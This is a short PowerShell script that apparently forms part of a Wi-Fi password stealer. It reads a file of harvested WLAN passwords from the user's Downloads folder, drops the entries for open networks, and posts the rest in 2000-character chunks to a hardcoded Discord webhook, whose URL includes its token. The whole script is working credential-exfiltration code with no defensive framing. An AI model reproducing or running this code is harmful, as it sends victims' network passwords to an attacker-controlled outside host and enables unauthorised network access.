# Variables
$FileToFind = "$env:USERPROFILE\Downloads\wlan_passwords.txt"
$WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"

# Check if file exists
if (-Not (Test-Path $FileToFind)) {
    Write-Host "File not found: $FileToFind"
    exit
}

Write-Host "File found: $FileToFind"

# Read file and filter lines
$FilteredLines = Get-Content $FileToFind | Where-Object { $_ -ne "PASS: <No password saved or open network>" }

# Join filtered lines
$FilteredContent = $FilteredLines -join "`n"

# Discord max message length
$MaxLength = 2000

# Split into chunks of max 2000 characters
for ($i = 0; $i -lt $FilteredContent.Length; $i += $MaxLength) {
    $Chunk = $FilteredContent.Substring($i, [Math]::Min($MaxLength, $FilteredContent.Length - $i))
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body @{ content = $Chunk }
}

Write-Host "Success!"
